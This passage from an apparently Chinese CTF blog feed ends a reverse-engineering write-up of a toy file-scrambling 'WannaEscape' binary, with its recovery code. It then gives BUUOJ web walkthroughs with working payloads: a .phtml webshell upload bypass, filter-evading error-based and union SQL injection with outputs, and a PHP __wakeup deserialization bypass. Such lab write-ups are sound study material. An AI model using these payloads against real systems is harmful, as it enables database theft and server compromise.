class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 c; <span class="comment">// [rsp+42Fh] [rbp+3AFh]</span></span><br><span class="line">  <span class="type">size_t</span> bufsz; <span class="comment">// [rsp+430h] [rbp+3B0h]</span></span><br><span class="line">  FILE *fout; <span class="comment">// [rsp+438h] [rbp+3B8h]</span></span><br><span class="line">  FILE *fin; <span class="comment">// [rsp+440h] [rbp+3C0h]</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [rsp+448h] [rbp+3C8h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  fin = fopen(<span class="string">&quot;required_essay.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  fout = fopen(<span class="string">&quot;required_essay.txt.WannaEscape&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fin &amp;&amp; fout )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( bufsz = <span class="number">0</span>i64; ; fwrite(buf, <span class="number">1u</span>i64, bufsz, fout) )</span><br><span class="line">    &#123;</span><br><span class="line">      bufsz = fread(buf, <span class="number">1u</span>i64, <span class="number">0x400</span>ui64, fin);<span class="comment">// 1024个一字节数据</span></span><br><span class="line">      <span class="keyword">if</span> ( !bufsz )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>i64; i &lt; bufsz; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        c = buf[i];</span><br><span class="line">        c += (i &amp; <span class="number">0xF</span>) + <span class="number">127</span>;</span><br><span class="line">        buf[i] = c;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fin);</span><br><span class="line">    fclose(fout);</span><br><span class="line">    system(<span class="string">&quot;del required_essay.txt&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;del WannaEscape.exe&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( fin )</span><br><span class="line">      fclose(fin);</span><br><span class="line">    <span class="keyword">if</span> ( fout )</span><br><span class="line">      fclose(fout);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单浏览一下程序的功能：读入”required_essay.txt”文本（这就是我们要恢复英语大作业）的数据，再打开”required_essay.txt.WannaEscape”用于写入数据，然后每次读入1024个1字节大小的数据到buf指针中（这里它的定义是”unsigned _int8”可能是指占8位的整数类型，因为用他存储的是一字节大小的数据），然后做一个简单的运算，然后输出到文件”required_essay.txt.WannaEscape”中，因此这就是个经过恶意处理的备份论文。</p>
<p><code>fopen()</code> 应该是C语言中的打开文件函数，第二项参数是打开模式，<code>size_t fwrite(const void * buffer, size_t size, size_t count, FILE * stream)</code> 会从buffer中读取count个size字节大小数据写入到文件流中，<code>fread()</code> 类似，不过它会返回读取的数据大小；<code>0i64</code> 的写法表示的是int64类型的数值0，<code>1ui64</code> 类似。</p>
<p><code>i &amp; 0xF</code> 是将i的最后四位保留，其他全部置0，得到的数值再加上127，加到原论文的字节值中，但其实不用计算具体数值，因为它只由迭代的i决定，恢复的时候直接剪掉即可。最后调用 <code>system()</code> 函数删除原论文文件和病毒文件本身。因为本地是没有原论文文件的，所以文件会打开失败导致循环不执行，这两条删除语句是执行不到的，但是由于”required_essay.txt.WannaEscape”被用于输出打开过，会被直接置空，所以如果在本地运行该程序，会出现没发生任何事但是论文备份却变空的情况。接下来用C++恢复原论文：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  fstream fin,fout;</span><br><span class="line">  fin.<span class="built_in">open</span>(<span class="string">&quot;required_essay.txt.WannaEscape&quot;</span>,ios::binary|ios::in);</span><br><span class="line">  fout.<span class="built_in">open</span>(<span class="string">&quot;essay.txt&quot;</span>,ios::binary|ios::out);</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>],c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(fin.<span class="built_in">read</span>(s,<span class="number">1024</span>))&#123;</span><br><span class="line">    <span class="type">int</span> readBytes=fin.<span class="built_in">gcount</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;readBytes;i++)&#123;</span><br><span class="line">      c=s[i];</span><br><span class="line">      c-=(i &amp; <span class="number">0xF</span>)+<span class="number">127</span>;</span><br><span class="line">      s[i]=c;</span><br><span class="line">    &#125;</span><br><span class="line">    fout.<span class="built_in">write</span>(s,readBytes);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  fin.<span class="built_in">close</span>();</span><br><span class="line">  fout.<span class="built_in">close</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其实C++也可以采用 <code>fopen()</code> 等函数，这一类都在 <code>cstdio</code> 文件头中；这里用的是文件流，由于是一个字节一个字节的存，所以声明 <code>char</code> 类型的变量，这里不能用 <code>char *s</code> ，因为s最多存八个字节的内容（我也不知道为什么），只能声明一个 <code>char s[1024]</code> ；</p>
<p>地址范围：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1C09H:4096+12*256+0+9=7177字节</span><br></pre></td></tr></table></figure></div>

<p>然后由于文件大小并非1024的整数倍，所以要记录读取的字节数用于迭代 <code>int readBytes=fin.gcount()</code> ；恢复后得到一篇没什么用的英语论文，里面藏着一串flag：<code>r00t&#123;50-l0n6-4nd-7h4nk5-f0r-4ll-7h3-f15h&#125;</code>  </p>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://www.icourse163.org/spoc/learn/DHU-1464535194?tid=1465433514#/learn/content?type=detail&id=1245608367" >学校慕课课程的C++资料（挺好用的） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/xiaoxxcool/article/details/2460110" >C++ fopen() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://vimsky.com/examples/usage/fread-function-in-c.html" >C++ fread() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/joeblackzqq/archive/2011/02/15/1955440.html" >__int64 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://vimsky.com/examples/usage/cpp-programming_library-function_cstdio_fwrite.html" >C++ fwrite()用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<p><strong>英文手册</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">captcha:验证码</span><br><span class="line">immutable:不可变的</span><br><span class="line">ciphertext:密文</span><br><span class="line">Disk:磁盘</span><br><span class="line">Memory:内存</span><br><span class="line">kernel:内河</span><br><span class="line">heap:堆</span><br><span class="line">canary:Linux系统cookie</span><br><span class="line">bypass:绕过</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>BUUOJ——WEB（二）</title>
    <url>/2023/04/28/Security/CTF/BUUOJ%E2%80%94%E2%80%94WEB%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h2 id="ACTF2020-新生赛-Upload（1）"><a href="#ACTF2020-新生赛-Upload（1）" class="headerlink" title="[ACTF2020 新生赛]Upload（1）"></a>[ACTF2020 新生赛]Upload（1）</h2><p>上传文件的题目，直接上传php文件，在前端被检测出来，提示只能使用gif，png，jpg等后缀，下断点绕过前端检测后，php文件仍无法上传，服务器过滤了黑名单”php”，尝试”PHP”，可以上传，但服务器无法解析为php文件（Linux？），尝试”phtml”，上传成功且服务器可以解析！直接利用一句话木马 <code>cat /flag</code> 即可</p>
<p>flag：flag{a8a3d35f-375b-44e1-932a-b9edcd5e76b0}</p>
<h2 id="极客大挑战-2019-BabySQL（1）"><a href="#极客大挑战-2019-BabySQL（1）" class="headerlink" title="[极客大挑战 2019]BabySQL（1）"></a>[极客大挑战 2019]BabySQL（1）</h2><p>Tips：本题直接在username中注入即可，passwd随便填写</p>
<h3 id="解法一：报错注入"><a href="#解法一：报错注入" class="headerlink" title="解法一：报错注入"></a>解法一：报错注入</h3><p>利用：<code>1&#39; pat</code> 可以试探pat是否被过滤，测试发现”selelct”,”or”,”and”,”from”遭到了过滤，但只是删除一次完全匹配的字符串，可以利用”oorr”来绕过，单引号注入有效，登陆成功后只给了密码，flag需要利用报错注入得到</p>
<p>堆叠注入无效，分号没被过滤但无法利用分号执行多语句，会出现”SQL syntax error”</p>
<p>利用”extractvalue()”进行报错注入时应注意，若语句执行成功会出现”XPATH syntax error”，可以得到关键信息；若语句执行不成功会出现”SQL syntax error”，无法获得关键信息。应区分有效与无效的报错</p>
<p><strong>本题由于存在or过滤，很多函数包含or的都要反过滤</strong></p>
<p>获取库名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, database(), 0x7e))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt; XPATH syntax error: &#x27;</span><span class="operator">~</span>geek<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>获取表名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, (seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;</span>geek<span class="string">&#x27;), 0x7e))    #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;~b4bsql,geekuser~</span></span><br></pre></td></tr></table></figure></div>

<p>获取列名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, (seselectlect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;</span>b4bsql<span class="string">&#x27;), 0x7e))  #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;id,username,password</span></span><br></pre></td></tr></table></figure></div>

<p>连接后直接查询看看，由于报错一般都有长度限制，因此用substring函数截取：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, subsubstrstr((seselectlect group_concat(passwoorrd) frfromom b4bsql),1,16), 0x7e))  #</span></span><br></pre></td></tr></table></figure></div>

<p>这里过滤了substr（<code>substring</code> 与 <code>substr</code> 是具有相同功能的函数），先利用 <code>locate(substr, str)</code> 定位flag位置，再查找：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, locate(&quot;flag&#123;&quot;,(seselectlect group_concat(passwoorrd) frfromom b4bsql)), 0x7e))  #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;XPATH syntax error: &#x27;</span><span class="operator">~</span><span class="number">153</span><span class="operator">~</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> oorr extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>, <span class="keyword">left</span>((seselectlect group_concat(passwoorrd) frfromom b4bsql),<span class="number">153</span>，<span class="number">24</span>), <span class="number">0x7e</span>))#</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span>XPATH syntax error: <span class="string">&#x27;~flag&#123;3015460e-88df-4ebb-~&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, subssubstrtr((seselectlect group_concat(passwoorrd) frfromom b4bsql),177,24), 0x7e))  #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;XPATH syntax error: &#x27;</span><span class="operator">~</span>b356<span class="number">-0043</span>a5c16392&#125;<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>得到flag：flag{3015460e-88df-4ebb-b356-0043a5c16392}</p>
<ul>
<li><code>group_concat(column_name1,column_name2)</code> 将多行结果合并为一行，多列结果合并为一列；列与列直接之间相连，随后不同行的的数据用 <code>,</code> 分隔，逐行进行扫描</li>
<li><a class="link"   href="https://www.cnblogs.com/vofill/p/6806962.html" >SQL字符串截取 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><code>left(length)</code> 在读取到最大长度后就不能再读取了；<code>right(length)</code> 在读取到最大长度后读取的起点会向左偏移，它先检索到字符串起点，再读取子串</li>
<li><code>extract(&#39;目标xml文件名&#39;, &#39;xml中检索的字符串&#39;)</code> 该函数用于查询xml文件中的特定字符串，<code>0x7e</code> 代表字符 <code>~</code> ，拼接在要获取的信息周围再拼接到路径中去就会在字符串周围产生错误，从而报错注入</li>
</ul>
<h3 id="其他打开方式"><a href="#其他打开方式" class="headerlink" title="其他打开方式"></a>其他打开方式</h3><p>参考：<a class="link"   href="https://blog.csdn.net/qq_36618918/article/details/121691162" >极客大挑战 2019 BabySQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>（原来FUZZ就是扫描）先FUZZ测试过滤词典；然后利用 <code>order by num</code> 中num不能大于等于列数来获取字段个数（by也被过滤）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; oorrder bbyy 4--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;Unknown column &#x27;</span><span class="number">4</span><span class="string">&#x27; in &#x27;</span><span class="keyword">order</span> clause<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>能测试出只有三个字段，利用 <code>union select</code> 测试回显的字段：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ununionion seselectlect 1,2,3-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;Hello 2！Your password is &#x27;</span><span class="number">3</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>说明回显位为第二个字段和第三个字段，查询所有库：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span>information_schema,mysql,performance_schema,test,ctf,geek<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>查询CTF库的所有表：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;</span>ctf<span class="string">&#x27;-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;Your password is &#x27;</span>Flag<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>查询FLAG表的字段：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;</span>Flag<span class="string">&#x27;-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;Your password is &#x27;</span>flag<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>只有一个字段flag，读取flag：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;Your password is &#x27;</span>flag&#123;<span class="number">893</span>a0115<span class="operator">-</span>fb96<span class="number">-44</span>be<span class="number">-947</span>f<span class="number">-0</span>d1c1ab52346&#125;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>字段从flag替换为 <code>*</code> 不行。</p>
<h2 id="极客大挑战-2019-PHP（1）"><a href="#极客大挑战-2019-PHP（1）" class="headerlink" title="[极客大挑战 2019]PHP（1）"></a>[极客大挑战 2019]PHP（1）</h2><p>网站源码有备份，用dirmap扫出来是”WWW.zip”（记下来了），解压后得到网站的完整源码。有一个反序列化的洞，用GET方式上传一个”select”，getSerialize代码如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这里有一个问题，注意到类中的两个变量都是”private”，经过测试，php版本为7.1或5.6时，序列化严格区分private和public，传入的是哪种类型就会得到哪种类型的变量，而本题的环境需要严格区分两种类型，需要传入private类型两个变量参数，很不巧的是private类型序列化后得到的内容是这样的：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;\000Name\000username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;\000Name\000password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中”\000”是空字符，使用phpstudy，php版本为7.3.4搭建环境测试时，空字符在网页中完全不输出（不占位置），但在字符串中会计入长度，而他们是标记参数类型的重要字符，因此必须要有，因此传入网站时用URL编码为”%00”。另一个问题，源码中有一个魔术函数：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数会在调用 <code>unserialize()</code> 函数时优先调用，强行修改”username”参数，因此需要绕过这个 <code>__wakeup()</code> ，在PHP5&lt;5.6.25，PHP7 &lt; 7.0.10时，传入的反序列化字符串中如果对象的变量个数参数大于实际的变量个数，那么就会绕过”__wakeup”，因此最终传入的payload：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>Name中实际上只有两个参数，将数量参数修改为3即可实现绕过。</p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>个人感觉本题是想考察”__wakeup”的绕过，但随着php版本的更新，序列化对public与其他两种类型的识别也发生了变化。在PHP7&#x3D;7.3.4的环境中测试，传入的对象为public类型的参数时，”username”和”password”被当作private类型处理并序列化为了对象：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line"></span><br><span class="line">-&gt; <span class="keyword">object</span>(Name)<span class="comment">#1 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;username&quot;</span>:<span class="string">&quot;Name&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;guest&quot;</span></span><br><span class="line">    [<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Name&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">    <span class="keyword">int</span>(<span class="number">100</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>猜测在这里，php优先根据变量名称进行匹配，弱化了类型的区别直接赋值</p>
<p>但使用PHP5&#x3D;5.6或PHP7&#x3D;7.1时private类型与public类型进行了严格区分，不同类型”username”被识别不同的变量：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line"><span class="keyword">object</span>(Name)<span class="comment">#1 (4) &#123;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>:<span class="string">&quot;Name&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;guest&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Name&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;yesyes&quot;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;admin&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">100</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里严格区分了不同类型的变量，对于原来不存在的”public”类型的”username”直接新建并赋值，对于序列化中不存在的”private”类型的”username”通过类定义获取，因此就有了四个变量。</p>
<ul>
<li><code>vardump()</code> 输出变量的信息，包括对象与一般变量</li>
<li><code>error_reporting(0)</code> 关闭报错信息的输出</li>
<li><code>\00</code> 代表空字符，有些环境中它不输出，有些环境中它会占位，但输出为空，此时复制粘贴得不到它，因此需要自己添加。为了在php的字符串中表示空字符，需要：<code>&quot;\000&quot;</code> 。需要说明的是，php中反引号不识别转义，单引号只认识”\\“双反斜杠表示的但反斜杠，只有双引号才能完整识别转义，因此表示空字符时需要双引号包裹。<br>成功被识别的空字符会被记录到字符串长度中。</li>
<li><code>&lt;br&gt;</code> 与 <code>&lt;/br&gt;</code> 都是换行</li>
</ul>
<p>参考：[</p>
<p><a class="link"   href="https://code.y444.cn/php" >PHP在线测试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
<p><a class="link"   href="https://blog.csdn.net/Xxy605/article/details/117336343" >PHP——serialize()序列化类变量public、protected、private的区别 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
<p>]</p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>访问”index.php.bak”下载源码文件：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>考察PHP的神奇弱类型比较，只能输入数字并要与字符串相等，payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure></div>

<p>得到flag：flag{41e5ff6a-626b-4d84-a9f9-25705676b098}</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>参考：<a class="link"   href="https://www.cnblogs.com/echoDetected/p/13091486.html" >Easy_Calc_WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>起初以为是JS写的，实际上是PHP写的calc。F12中注释标明有防火墙，实际上防火墙有两层，一层是源码中的，过滤敏感字符；一层是服务器的（大概），检测到指定参数中有敏感字符则直接拒绝访问。</p>
<p>通过观察JS源码可以发现，一个隐藏的php文件是”calc.php”</p>
<p>JS源码：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#calc&#x27;</span>).<span class="title function_">submit</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).<span class="title function_">val</span>()),</span><br><span class="line">        <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">            $(<span class="string">&quot;#result&quot;</span>).<span class="title function_">html</span>(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">        &lt;/div&gt;`</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p>令人意想不到的是直接访问”calc.php”能看到源码（这合理吗？）</p>
<p>“calc.php”源码：</p>
